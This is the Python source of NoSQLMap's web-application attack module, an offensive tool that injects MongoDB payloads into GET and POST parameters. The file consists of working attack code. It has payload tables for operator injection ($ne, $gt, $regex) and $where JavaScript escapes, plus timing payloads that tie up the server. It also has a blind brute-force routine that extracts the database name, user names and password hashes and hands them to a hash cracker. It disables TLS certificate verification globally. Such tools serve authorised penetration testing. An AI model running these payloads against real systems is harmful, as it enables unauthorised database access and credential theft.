#!/usr/bin/env python3
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

"""NoSQL injection attacks against web applications (GET and POST).

Structure
---------
* The payloads are *data*, not code: :data:`GET_PAYLOADS` holds one query
  fragment per test and :data:`GET_TESTS` / :data:`POST_TESTS` describe each
  attack step.  The attack functions walk those tables instead of repeating
  a block of boilerplate per payload.
* :class:`WebClient` owns the HTTP plumbing (requests, responses, timing).
* Findings are collected in a :class:`Findings` instance that is passed
  explicitly around instead of through module globals.
"""

import random
import string
import time
import urllib.error
import urllib.parse
import urllib.request

from . import mongodb

# Fix for dealing with self-signed certificates.  This is wrong and highly
# discouraged, to be revisited in a stable branch.
import ssl

ssl._create_default_https_context = ssl._create_unverified_context


def args():
    return [
        ["--injectedParameter", "Parameter to be injected"],
        ["--injectSize", "Size of payload"],
        [
            "--injectFormat",
            "1-Alphanumeric, 2-Letters only, 3-Numbers only, 4-Email address",
        ],
        ["--params", "Enter parameters to inject in a comma separated list"],
        ["--doTimeAttack", "Start timing based tests (y/n)"],
        ["--savePath", "output file name"],
    ]


# The per-payload GET URL table, populated by :func:`buildUri` (index ==
# payload index) and read by the GET attack and the DB-info brute force.
uriArray = []

# ---------------------------------------------------------------------------
# Payload tables
# ---------------------------------------------------------------------------

# The 10 second sleep loop shared by the GET timing payloads.
_SLEEP = (
    "var date = new Date(); var curDate = null; do { curDate = new Date(); } "
    "while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; "
)

# One entry per injection payload, in the order the tests expect.  Each entry
# is a query-fragment template: ``{p}`` is replaced by the injected parameter
# name and ``{r}`` by the random baseline value.  Plain ``str.replace`` (not
# ``str.format``) is used so the JS braces in the sleep payloads stay intact.
GET_PAYLOADS = [
    "{p}={r}",                                            # 0  random baseline
    "{p}[$ne]=",                                          # 1  BSON $ne (empty value)
    "{p}=a'; return db.a.find(); var dummy='!",           # 2  $where string escape, find()
    "{p}=1; return db.a.find(); var dummy=1",             # 3  $where integer escape, find()
    "{p}=a'; return db.a.findOne(); var dummy='!",        # 4  $where string escape, findOne()
    "{p}=1; return db.a.findOne(); var dummy=1",          # 5  $where integer escape, findOne()
    "{p}=a'; return this.a != '{r}'; var dummy='!",       # 6  $where this != string escape
    "{p}=1; return this.a !={r}; var dummy=1",            # 7  $where this != integer escape
    "{p}[$gt]=",                                          # 8  BSON $gt (empty value)
    "{p}=1; " + _SLEEP + "var dummy=1",                   # 9  timing (integer escape)
    '{p}=a"; return db.a.find(); var dummy=\'!',          # 10 double-quote, find()
    '{p}=a"; return this.a != \'{r}\'; var dummy=\'!',    # 11 double-quote, this !=
    '{p}=a"; return db.a.findOne(); var dummy="\'!',      # 12 double-quote, findOne()
    '{p}=a"; ' + _SLEEP + 'var dummy="\'!',               # 13 timing (double-quote)
    "{p}a'; return true; var dum='a",                     # 14 string escape, return true (no =)
    "{p}1; return true; var dum=2",                       # 15 integer, return true (no =)
    "{p}=a'; ---",                                        # 16 DB-info template (--- replaced by getDBInfo)
    "{p}=1; if ---",                                      # 17 DB-info template (numeric if)
    "{p}=a'; " + _SLEEP + "var dummy='!",                 # 18 timing (string escape)
    "{p}[$regex]=",                                       # 19 BSON $regex (empty value)
    "{p}[$exists]=",                                      # 20 BSON $exists (empty value)
]

# The GET attack: (test number, short label, payload index into uriArray,
# verbose message).  The loop in ``getApps`` walks this table.
GET_TESTS = [
    (1, "PHP/ExpressJS != associative array injection", 1,
     "Testing Mongo PHP not equals associative array injection using {uri}..."),
    (2, "$where injection (string escape)", 2,
     "Testing Mongo <2.4 $where all Javascript string escape attack for all records... Injecting {uri}"),
    (3, "$where injection (integer escape)", 3,
     "Testing Mongo <2.4 $where Javascript integer escape attack for all records... Injecting {uri}"),
    (4, "$where injection string escape (single record)", 4,
     "Testing Mongo <2.4 $where all Javascript string escape attack for one record... Injecting {uri}"),
    (5, "$where injection integer escape (single record)", 5,
     "Testing Mongo <2.4 $where Javascript integer escape attack for one record... Injecting {uri}"),
    (6, "This != injection (string escape)", 6,
     "Testing Mongo this not equals string escape attack for all records... Injecting {uri}"),
    (7, "This != injection (integer escape)", 7,
     "Testing Mongo this not equals integer escape attack for all records... Injecting {uri}"),
    (8, "PHP/ExpressJS > Undefined Injection", 8,
     "Testing PHP/ExpressJS > undefined attack for all records... Injecting {uri}"),
    (9, "PHP/ExpressJS [$regex] associative array injection", 19,
     "Testing PHP/ExpressJS [$regex] associative array injection... Injecting {uri}"),
    (10, "PHP/ExpressJS [$exists] associative array injection", 20,
     "Testing PHP/ExpressJS [$exists] associative array injection... Injecting {uri}"),
]

# The POST attack: (test number, short label, payload spec, verbose message).
# A payload spec is either "ne"/"gt" (the parameter is replaced by
# ``param[$ne]`` / ``param[$gt]`` with an empty value) or a value template in
# which ``{r}`` is replaced by the random baseline value.
POST_TESTS = [
    (1, "PHP/ExpressJS != associative array injection", "ne",
     "Testing Mongo PHP not equals associative array injection using {data}..."),
    (2, "PHP/ExpressJS > Undefined Injection", "gt",
     "Testing PHP/ExpressJS > undefined injection using {data}..."),
    (3, "$where injection (string escape)", "a'; return db.a.find(); var dummy='!",
     "Testing Mongo <2.4 $where all Javascript string escape attack for all records... Injecting {data}"),
    (4, "$where injection (integer escape)", "1; return db.a.find(); var dummy=1",
     "Testing Mongo <2.4 $where Javascript integer escape attack for all records... Injecting {data}"),
    (5, "$where injection string escape (single record)", "a'; return db.a.findOne(); var dummy='!",
     "Testing Mongo <2.4 $where all Javascript string escape attack for one record... Injecting {data}"),
    (6, "$where injection integer escape (single record)", "1; return db.a.findOne(); var dummy=1",
     "Testing Mongo <2.4 $where Javascript integer escape attack for one record... Injecting {data}"),
    (7, "This != injection (string escape)", "a'; return this.a != '{r}'; var dummy='!",
     "Testing Mongo this not equals string escape attack for all records... Injecting {data}"),
    (8, "This != injection (integer escape)", "1; return this.a != '{r}'; var dummy=1",
     "Testing Mongo this not equals integer escape attack for all records... Injecting {data}"),
]

# The POST timing payloads differ slightly from the GET ones (argument order
# in the sleep loop and the trailing return), so they are kept verbatim.
POST_TIMING_STRING = (
    "a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } "
    "while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"
)
POST_TIMING_INTEGER = (
    "1; var date = new Date(); var curDate = null; do { curDate = new Date(); } "
    "while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"
)

# Response fragments that indicate the injection reached the database engine.
_ERROR_MARKERS = ("ReferenceError", "SyntaxError", "ILLEGAL")


def _render(template, name, rand_value):
    """Substitute the ``{p}``/``{r}`` placeholders in a payload template."""
    return template.replace("{p}", name).replace("{r}", rand_value)


def buildUri(origUri, randValue, args=None):
    """Build the per-payload URL table and return the random baseline URL.

    Splits ``origUri`` into path and query parameters, lets the user select
    the parameter(s) to inject, then builds one URL per :data:`GET_PAYLOADS`
    entry: selected parameters get the payload, the others keep their
    original value.  The full table is stored in the module-level
    ``uriArray`` (index == payload index); the baseline (index 0) is
    returned.
    """
    global uriArray

    path, _, query = origUri.partition("?")
    params = urllib.parse.parse_qsl(query, keep_blank_values=True)

    print("List of parameters:")
    for i, (name, _) in enumerate(params, start=1):
        print(str(i) + "-" + name)

    if args is None:
        inj_index = input("Enter parameters to inject in a comma separated list:  ")
    else:
        inj_index = args.params

    try:
        inj_opt = [params[int(i) - 1][0] for i in inj_index.split(",")]
    except (ValueError, IndexError):
        if args is None:
            input("Something went wrong.  Press enter to return to the main menu...")
        return ()

    for name in inj_opt:
        print("Injecting the " + name + " parameter...")

    uriArray = []
    for template in GET_PAYLOADS:
        fragments = [
            _render(template, name, randValue) if name in inj_opt else name + "=" + value
            for name, value in params
        ]
        uriArray.append(path + "?" + urllib.parse.quote_plus("&".join(fragments)))

    return uriArray[0]


def _post_data(base, param, spec, rand_value):
    """Build a fresh POST-data dict for one test (``base`` is not mutated)."""
    data = dict(base)
    data.pop(param, None)
    if spec == "ne":
        data[param + "[$ne]"] = ""
    elif spec == "gt":
        data[param + "[$gt]"] = ""
    else:
        data[param] = spec.replace("{r}", rand_value)
    return data


def _post_body(data):
    return urllib.parse.urlencode(data).encode("utf-8")


# ---------------------------------------------------------------------------
# HTTP plumbing
# ---------------------------------------------------------------------------

def getResponseBodyHandlingErrors(req):
    try:
        responseBody = urllib.request.urlopen(req).read()
    except urllib.error.HTTPError as err:
        responseBody = err.read()

    # Decode to ``str`` so callers can use ``str.find`` (the tool's error
    # detection does ``errorCheck.find("ReferenceError")``); ``bytes.find``
    # with a ``str`` argument raises ``TypeError`` on Python 3. ``errors=
    # "replace"`` guards against non-UTF-8 error pages.
    return responseBody.decode("utf-8", errors="replace")


class WebClient:
    """Owns the HTTP plumbing so the attack functions stay declarative."""

    def __init__(self, url, request_headers):
        self.url = url
        self.headers = request_headers

    def _request(self, url, data):
        return urllib.request.Request(url, data, self.headers)

    def probe(self, data=None):
        """Hit the base URL once.

        Returns ``(status_code, body, elapsed_seconds)``; ``(None, None,
        None)`` when the connection itself failed (message already printed).
        Non-2xx responses are returned as-is so the caller can report them.
        """
        req = self._request(self.url, data)
        start = time.time()
        try:
            resp = urllib.request.urlopen(req)
            code = resp.getcode()
            raw = resp.read()
        except urllib.error.HTTPError as err:
            code = err.code
            raw = err.read()
        except urllib.error.URLError as err:
            print(err)
            print("Looks like the server didn't respond.  Check your options.")
            return None, None, None
        return code, raw.decode("utf-8", errors="replace"), time.time() - start

    def timed_request(self, url=None, data=None):
        """Send a request and return ``(body, elapsed_seconds)``."""
        req = self._request(url or self.url, data)
        start = time.time()
        body = getResponseBodyHandlingErrors(req)
        return body, time.time() - start

    def request(self, url=None, data=None):
        """Send a request and return the response body as text."""
        return self.timed_request(url, data)[0]


# ---------------------------------------------------------------------------
# Result handling
# ---------------------------------------------------------------------------

class Findings:
    """Attack results, passed explicitly instead of via module globals."""

    def __init__(self):
        self.vulnerable = []
        self.possible = []
        self.string_timing = False
        self.integer_timing = False
        self.mongo_lt_24 = False


def errorTest(body, request_repr, findings):
    """Record ``request_repr`` as possibly vulnerable when ``body`` contains
    a MongoDB error.  Returns True when an error was found."""
    if any(marker in body for marker in _ERROR_MARKERS):
        print("Injection returned a MongoDB Error.  Injection may be possible.")
        findings.possible.append(request_repr)
        return True
    return False


def checkResult(base_size, resp_size, test_num, request_repr, findings, verb="OFF"):
    """Compare an injected response to the baseline and record the result."""
    delta = abs(resp_size - base_size)

    if delta >= 100 and resp_size != 0:
        if verb == "ON":
            print(
                "Response varied "
                + str(delta)
                + " bytes from random parameter value! Injection works!"
            )
        else:
            print("Successful injection!")
        findings.vulnerable.append(request_repr)
        # The $where escape payloads (tests 3-6) only work on MongoDB < 2.4.
        if test_num in (3, 4, 5, 6):
            findings.mongo_lt_24 = True

    elif 0 < delta < 100 and resp_size != 0:
        if verb == "ON":
            print(
                "Response variance was only "
                + str(delta)
                + " bytes. Injection might have worked but difference is too small to be certain. "
            )
        else:
            print("Possible injection.")
        findings.possible.append(request_repr)

    elif delta == 0:
        if verb == "ON":
            print(
                "Random string response size and not equals injection were the same. Injection did not work."
            )
        else:
            print("Injection failed.")

    else:
        if verb == "ON":
            print(
                "Injected response was smaller than random response.  Injection may have worked but requires verification."
            )
        else:
            print("Possible injection.")
        findings.possible.append(request_repr)


def decode_payloads(addrs):
    """Return ``addrs`` with each URL's query string decoded so the injection
    payload is human-readable (e.g. ``acctid[$ne]=...`` instead of
    ``acctid%5B%24ne%5D=...``). Non-URL entries (e.g. POST-data dict strings)
    are passed through unchanged."""
    decoded = []
    for addr in addrs:
        if isinstance(addr, str) and "?" in addr:
            path, _, query = addr.partition("?")
            addr = path + "?" + urllib.parse.unquote_plus(query)
        decoded.append(addr)
    return decoded


def save_to(savePath, findings):
    with open(savePath, "w") as fo:
        fo.write("Vulnerable URLs:\n")
        fo.write("\n".join(decode_payloads(findings.vulnerable)))
        fo.write("\n\n")
        fo.write("Possibly Vulnerable URLs:\n")
        fo.write("\n".join(decode_payloads(findings.possible)))
        fo.write("\n")
        fo.write("Timing based attacks:\n")
        fo.write(
            "String Attack-"
            + ("Successful\n" if findings.string_timing else "Unsuccessful\n")
        )
        fo.write(
            "Integer attack-"
            + ("Successful\n" if findings.integer_timing else "Unsuccessful\n")
        )


def print_report(findings, vuln_label="Vulnerable URLs:", poss_label="Possibly vulnerable URLs:"):
    print("\n")
    print(vuln_label)
    print("\n".join(decode_payloads(findings.vulnerable)))
    print("\n")
    print(poss_label)
    print("\n".join(decode_payloads(findings.possible)))
    print("\n")
    print("Timing based attacks:")
    print("String attack-" + ("Successful" if findings.string_timing else "Unsuccessful"))
    print("Integer attack-" + ("Successful" if findings.integer_timing else "Unsuccessful"))


def _timing_test(send, time_base, label):
    """Run one timing-based test.  ``send`` is a zero-arg callable that
    performs the request and returns the elapsed seconds."""
    print(label + "...")
    delta = int(round(send(), 3)) - time_base
    # The sleep payloads run per document, so the total delay scales with the
    # number of records; a high bar avoids false positives from small delays.
    if delta > 25:
        print(
            "HTTP load time variance was "
            + str(delta)
            + " seconds! Injection possible."
        )
        return True

    print(
        "HTTP load time variance was only "
        + str(delta)
        + " seconds.  Injection probably didn't work."
    )
    return False


def _post_timing(client, base_data, param, payload, time_base, label):
    """Run one POST timing-based test with ``payload`` in ``param``."""
    data = dict(base_data)
    data[param] = payload
    return _timing_test(lambda: client.timed_request(data=_post_body(data))[1], time_base, label)


def _prompt_size():
    while True:
        size = input("Baseline test-Enter random string size: ")
        if size.isdigit():
            return int(size)
        print("Invalid! The size should be an integer.")


def _prompt_injection_size_and_format(args):
    """Return ``(size, format)`` from the CLI args or the interactive menu."""
    if args is None:
        size = _prompt_size()
        return size, randInjString(size)
    # ``--injectFormat`` is optional; default to alphanumeric ("1").
    return int(args.injectSize), args.injectFormat or "1"


def _prompt_save(findings, args):
    """Save the findings when the user (or ``--savePath``) asks for it."""
    if args is None:
        file_out = input("Save results to file (y/n)? ")
    else:
        file_out = "y" if args.savePath else "n"

    if file_out.lower() == "y":
        save_path = input("Enter output file name: ") if args is None else args.savePath
        save_to(save_path, findings)


# ---------------------------------------------------------------------------
# GET attack
# ---------------------------------------------------------------------------

def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
    print("Web App Attacks (GET)")
    print("===============")

    scheme = "https" if https == "ON" else "http"
    app_url = (
        scheme + "://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()
    )

    print("Checking to see if site at " + app_url + " is up...")
    client = WebClient(app_url, requestHeaders)
    code, body, time_base = client.probe()

    if code is None:
        return ()
    if code != 200:
        print("Got " + str(code) + " from the app, check your options.")
        return ()

    norm_length = len(body)
    if verb == "ON":
        print(
            "App is up! Got response length of "
            + str(norm_length)
            + " and response time of "
            + str(round(time_base, 3))
            + " seconds.  Starting injection test.\n"
        )
    else:
        print("App is up!")

    inject_size, string_format = _prompt_injection_size_and_format(args)
    inject_string = build_random_string(string_format, inject_size)
    print("Using " + inject_string + " for injection testing.\n")

    if "?" not in app_url:
        print("No URI parameters provided for GET request...Check your options.\n")
        if args is None:
            input("Press enter to continue...")
        return ()

    random_uri = buildUri(app_url, inject_string, args)
    print("URI : " + random_uri)

    if verb == "ON":
        print(
            "Checking random injected parameter HTTP response size using "
            + random_uri
            + "...\n"
        )
    else:
        print("Sending random parameter value...")

    rand_length = len(client.request(random_uri))
    print("Got response length of " + str(rand_length) + ".")

    delta = abs(norm_length - rand_length)
    if delta == 0:
        print("No change in response size injecting a random parameter..\n")
    else:
        print("Random value variance: " + str(delta) + "\n")

    findings = Findings()
    for i, (num, label, idx, verbose) in enumerate(GET_TESTS):
        if i:
            print()
        target = uriArray[idx]
        if verb == "ON":
            print(verbose.format(uri=target))
        else:
            print("Test " + str(num) + ": " + label)
        body = client.request(target)
        if not errorTest(body, target, findings):
            checkResult(rand_length, len(body), num, target, findings, verb)

    if args is None:
        do_time_attack = input("Start timing based tests (y/n)? ")
    else:
        # ``--doTimeAttack`` is optional; default to "n" when not supplied.
        do_time_attack = args.doTimeAttack or "n"

    if do_time_attack.lower() == "y":
        findings.string_timing = _timing_test(
            lambda: client.timed_request(uriArray[18])[1],
            time_base,
            "Starting Javascript string escape time based injection",
        )
        findings.integer_timing = _timing_test(
            lambda: client.timed_request(uriArray[9])[1],
            time_base,
            "Starting Javascript integer escape time based injection",
        )

    if findings.mongo_lt_24 and args is None:
        if (
            input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ").lower()
            == "y"
        ):
            getDBInfo(client)

    print_report(findings)
    _prompt_save(findings, args)

    if args is None:
        input("Press enter to continue...")
    return ()


# ---------------------------------------------------------------------------
# POST attack
# ---------------------------------------------------------------------------

def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=None):
    print("Web App Attacks (POST)")
    print("===============")

    scheme = "https" if https == "ON" else "http"
    app_url = scheme + "://" + str(victim) + ":" + str(webPort) + str(uri)

    print("Checking to see if site at " + app_url + " is up...")
    client = WebClient(app_url, requestHeaders)
    base_data = dict(postData)  # work on a copy; never mutate the caller's dict

    code, body, time_base = client.probe(data=_post_body(base_data))

    if code is None:
        return ()
    if code != 200:
        print("Got " + str(code) + " from the app, check your options.")
        return ()

    norm_length = len(body)
    if verb == "ON":
        print(
            "App is up! Got response length of "
            + str(norm_length)
            + " and response time of "
            + str(round(time_base, 3))
            + " seconds.  Starting injection test.\n"
        )
    else:
        print("App is up!")

    print("List of parameters:")
    for i, name in enumerate(base_data, start=1):
        print(str(i) + "-" + name)

    try:
        if args is None:
            inj_index = int(input("Which parameter should we inject? "))
        else:
            inj_index = int(args.injectedParameter)
    except (ValueError, IndexError):
        if args is None:
            input("Something went wrong.  Press enter to return to the main menu...")
        return

    inj_opt = list(base_data)[inj_index - 1]
    print("Injecting the " + inj_opt + " parameter...")

    inject_size, string_format = _prompt_injection_size_and_format(args)
    inject_string = build_random_string(string_format, inject_size)
    print("Using " + inject_string + " for injection testing.\n")

    # Baseline: the selected parameter set to a random value.
    base_data[inj_opt] = inject_string
    if verb == "ON":
        print(
            "Checking random injected parameter HTTP response size sending "
            + str(base_data)
            + "...\n"
        )
    else:
        print("Sending random parameter value...")

    rand_length = len(client.request(data=_post_body(base_data)))
    print("Got response length of " + str(rand_length) + ".")

    delta = abs(norm_length - rand_length)
    if delta == 0:
        print("No change in response size injecting a random parameter..\n")
    else:
        print("Random value variance: " + str(delta) + "\n")

    findings = Findings()
    for i, (num, label, spec, verbose) in enumerate(POST_TESTS):
        if i:
            print()
        data = _post_data(base_data, inj_opt, spec, inject_string)
        if verb == "ON":
            print(verbose.format(data=str(data)))
        else:
            print("Test " + str(num) + ": " + label)
        body = client.request(data=_post_body(data))
        if not errorTest(body, str(data), findings):
            checkResult(rand_length, len(body), num, str(data), findings, verb)

    do_time_attack = "n"
    if args is None:
        do_time_attack = input("Start timing based tests (y/n)? ")

    if do_time_attack.lower() == "y":
        findings.string_timing = _post_timing(
            client, base_data, inj_opt, POST_TIMING_STRING, time_base,
            "Starting Javascript string escape time based injection",
        )
        findings.integer_timing = _post_timing(
            client, base_data, inj_opt, POST_TIMING_INTEGER, time_base,
            "Starting Javascript integer escape time based injection",
        )

    print_report(
        findings, vuln_label="Exploitable requests:", poss_label="Possibly vulnerable requests:"
    )
    _prompt_save(findings, args)

    if args is None:
        input("Press enter to continue...")
    return ()


# ---------------------------------------------------------------------------
# Random-string builders
# ---------------------------------------------------------------------------

def randInjString(size):
    print("What format should the random string take?")
    print("1-Alphanumeric")
    print("2-Letters only")
    print("3-Numbers only")
    print("4-Email address")

    while True:
        format = input("Select an option: ")
        if format not in ["1", "2", "3", "4"]:
            print("Invalid selection.")
        else:
            break
    return format


def build_random_string(format, size):
    """Build a random injection string in the requested ``format``
    (1-alphanumeric, 2-letters, 3-digits, 4-email address)."""
    if format == "4":  # email address
        chars = string.ascii_letters + string.digits
        local = "".join(random.choice(chars) for _ in range(size))
        domain = "".join(random.choice(chars) for _ in range(size))
        return local + "@" + domain + ".com"

    chars = {
        "1": string.ascii_letters + string.digits,
        "2": string.ascii_letters,
        "3": string.digits,
    }[format]
    return "".join(random.choice(chars) for _ in range(size))


# ---------------------------------------------------------------------------
# Database-info brute force (MongoDB < 2.4, via the ``---`` template)
# ---------------------------------------------------------------------------

def _substitute(uri, old, new):
    """Replace ``old`` with ``new`` in a payload URL's query string, keeping
    the result properly percent-encoded."""
    path, _, query = uri.partition("?")
    decoded = urllib.parse.unquote_plus(query)
    return path + "?" + urllib.parse.quote_plus(decoded.replace(old, new))


def _send_template(client, js):
    """Send the DB-info template (``uriArray[16]``) with ``---`` replaced by
    ``js`` and return the response body."""
    return client.request(_substitute(uriArray[16], "---", js))


def _brute_length(js_for_n, client, base_len):
    """Increment n until ``js_for_n(n)`` returns the baseline response size."""
    n = 0
    while True:
        if len(_send_template(client, js_for_n(n))) == base_len:
            return n
        n += 1


def _brute_value(js_for_pos_char, client, base_len, length, alphabet):
    """Recover a value of known ``length`` by brute-forcing each character."""
    chars = []
    for pos in range(length):
        for ch in alphabet:
            if len(_send_template(client, js_for_pos_char(pos, ch))) == base_len:
                chars.append(ch)
                break
    return "".join(chars)


def _recover_user(client, base_len, skip):
    """Brute-force the next user name and its 32-character password hash.

    ``skip`` is the list of user names already recovered; the queries use
    ``{$nin: skip}`` so the next user is returned.
    """
    alphabet = string.ascii_letters + string.digits
    if skip:
        find = "db.system.users.findOne({user:{$nin:" + str(skip) + "}})"
    else:
        find = "db.system.users.findOne()"
    prefix = "var usr = " + find + "; if ("

    user_len = _brute_length(
        lambda n: prefix
        + "usr.user.length == " + str(n) + ") { return true; } var dum='a" + "&",
        client,
        base_len,
    )
    username = _brute_value(
        lambda i, c: prefix
        + "usr.user.charAt(" + str(i) + ") == '" + c + "') { return true; } var dum='a" + "&",
        client,
        base_len,
        user_len,
        alphabet,
    )
    pwd_hash = _brute_value(
        lambda i, c: prefix
        + "usr.pwd.charAt(" + str(i) + ") == '" + c + "') { return true; } var dum='a" + "&",
        client,
        base_len,
        32,
        alphabet,
    )
    return username, pwd_hash


def getDBInfo(client):
    """Brute-force the database name, user names and password hashes through
    the ``---`` template in ``uriArray[16]``."""
    alphabet = string.ascii_letters + string.digits

    print("Getting baseline True query return size...")
    base_len = len(_send_template(client, "return true; var dummy ='!" + "&"))
    print("Got baseline true query length of " + str(base_len))

    print("Calculating DB name length...")
    db_name_len = _brute_length(
        lambda n: "var curdb = db.getName(); if (curdb.length == "
        + str(n)
        + ") {return true;} var dum='a"
        + "&",
        client,
        base_len,
    )
    print("Got database name length of " + str(db_name_len) + " characters.")

    print("Database Name: ", end="")
    db_name = _brute_value(
        lambda i, c: "var curdb = db.getName(); if (curdb.charAt("
        + str(i)
        + ") == '"
        + c
        + "') { return true; } var dum='a"
        + "&",
        client,
        base_len,
        db_name_len,
        alphabet,
    )
    print(db_name)

    if input("Get database users and password hashes (y/n)? ").lower() != "y":
        return

    user_count = _brute_length(
        lambda n: "var usrcnt = db.system.users.count(); if (usrcnt == "
        + str(n)
        + ") { return true; } var dum='a",
        client,
        base_len,
    )
    print("Found " + str(user_count) + " user(s).")

    users, hashes = [], []
    for _ in range(user_count):
        username, pwd_hash = _recover_user(client, base_len, users)
        users.append(username)
        hashes.append(pwd_hash)
        print("Got user:hash " + username + ":" + pwd_hash)

    crack_hash = input("Crack recovered hashes (y/n)?:  ")
    while crack_hash.lower() == "y":
        for i, user in enumerate(users, start=1):
            print(str(i) + "-" + user)
        user_index = input("Select user hash to crack: ")
        mongodb.passCrack(users[int(user_index) - 1], hashes[int(user_index) - 1])
        crack_hash = input("Crack another hash (y/n)?")
    return
